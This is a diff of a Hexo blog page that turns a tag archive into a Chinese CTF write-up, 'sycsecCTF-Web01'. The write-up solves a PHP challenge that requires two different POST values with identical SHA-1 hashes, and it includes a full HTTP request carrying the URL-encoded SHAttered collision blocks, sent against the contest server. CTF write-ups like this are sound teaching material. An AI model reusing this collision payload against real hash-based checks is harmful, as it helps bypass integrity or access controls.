@@ -6,17 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://xyel.ml">
-  <title>Tag: SQL | xyel的Hexo小站</title>
+  <title>sycsecCTF-Web01 | xyel的Hexo小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这里是xyel的Hexo小站，欢迎米娜桑的访问！">
-<meta property="og:type" content="website">
-<meta property="og:title" content="xyel的Hexo小站">
-<meta property="og:url" content="https://xyel.ml/tags/SQL/index.html">
+  <meta name="description" content="Web-Welcome地址：http:&#x2F;&#x2F;49.234.224.119:8000&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sycsecCTF-Web01">
+<meta property="og:url" content="https://xyel.ml/sycsecCTF-Web01.html">
 <meta property="og:site_name" content="xyel的Hexo小站">
-<meta property="og:description" content="这里是xyel的Hexo小站，欢迎米娜桑的访问！">
+<meta property="og:description" content="Web-Welcome地址：http:&#x2F;&#x2F;49.234.224.119:8000&#x2F;">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-10-17T13:37:42.000Z">
+<meta property="article:modified_time" content="2020-10-17T15:12:17.215Z">
 <meta property="article:author" content="xyel">
-<meta property="article:tag" content="xyel">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
   
   
@@ -147,36 +150,62 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-sycsecCTF-Web01" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sycsecCTF-Web01
+    </h1>
+  
+
+        
+        <a href="/sycsecCTF-Web01.html" class="archive-article-date">
+  	<time datetime="2020-10-17T13:37:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-17</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Web-Welcome"><a href="#Web-Welcome" class="headerlink" title="Web-Welcome"></a>Web-Welcome</h1><h2 id="地址：http-49-234-224-119-8000"><a href="#地址：http-49-234-224-119-8000" class="headerlink" title="地址：http://49.234.224.119:8000/"></a>地址：<a target="_blank" rel="noopener" href="http://49.234.224.119:8000/">http://49.234.224.119:8000/</a></h2><a id="more"></a>
+
+<p>一打开405 Method Not Allowed</p>
+<p>百度405错误  得到答案换一种方式</p>
+<p>那么肯定是POST</p>
+<blockquote>
+<p>这里群里很多人说这是个错题  然后题目组就加了hint</p>
+</blockquote>
+<p>将GET改为POST  得到php源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] !== <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">header(<span class="string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;roam1&#x27;</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;roam2&#x27;</span>]))&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ($_POST[<span class="string">&#x27;roam1&#x27;</span>] !== $_POST[<span class="string">&#x27;roam2&#x27;</span>] &amp;&amp; sha1($_POST[<span class="string">&#x27;roam1&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;roam2&#x27;</span>]))&#123;</span><br><span class="line">        phpinfo();  <span class="comment">// collect information from phpinfo!</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计一下  意思应该是roam1！=roam2  但是sha1值相等</p>
+<p>运气很好  看到一篇文章  贴在下面</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/caiqiiqi/article/details/68953730">https://blog.csdn.net/caiqiiqi/article/details/68953730</a></p>
+<p>构造如下请求  得到回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 49.234.224.119:8000</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4195.1 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 1293</span><br><span class="line"></span><br><span class="line">roam1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;roam2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
+
+<p>回显很明显看到</p>
+<p>| auto_prepend_file    | /var/www/html/f1444aagggg.php |</p>
+<p>本来以为这道题就这么结束了  结果我直接输入这个提示我404</p>
+<p>然后我又不会了</p>
+<p>直接百度CTF phpinfo</p>
+<p>（以上内容划掉）</p>
+<p>试了各种文件包含失败  觉得肯定我哪儿错了</p>
+<p>然后打开回显  果然404上面有提示</p>
+<blockquote>
+<p>思考了一下觉得还在比的东西直接放flag出来不怎么好所以删掉了</p>
+</blockquote>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/sqli-lab03-04.html" class="archive-article-date">
-  	<time datetime="2020-09-16T02:39:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/sqli-lab03-04.html">sqli-lab03&amp;04</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -188,165 +217,119 @@
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
         		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
-        		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/sycsecCTF-Web01.html" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/sqli-lab02.html" class="archive-article-date">
-  	<time datetime="2020-09-16T01:59:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-16</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/sycsecCTF-Crypto01.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          sycsecCTF-Crypto01
+        
+      </div>
+    </a>
+  
+  
+    <a href="/0xCTF-Misc2.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">0xCTF-Misc2</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/sqli-lab02.html">sqli-lab02</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/sqli-lab01.html" class="archive-article-date">
-  	<time datetime="2020-09-15T13:33:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/sqli-lab01.html">sqli-lab01</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/Web%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8C%87%E5%8D%9704-SQL%E6%B3%A8%E5%85%A5.html" class="archive-article-date">
-  	<time datetime="2020-09-11T14:43:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/Web%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8C%87%E5%8D%9704-SQL%E6%B3%A8%E5%85%A5.html">Web安全防护指南04-SQL注入</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -369,9 +352,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
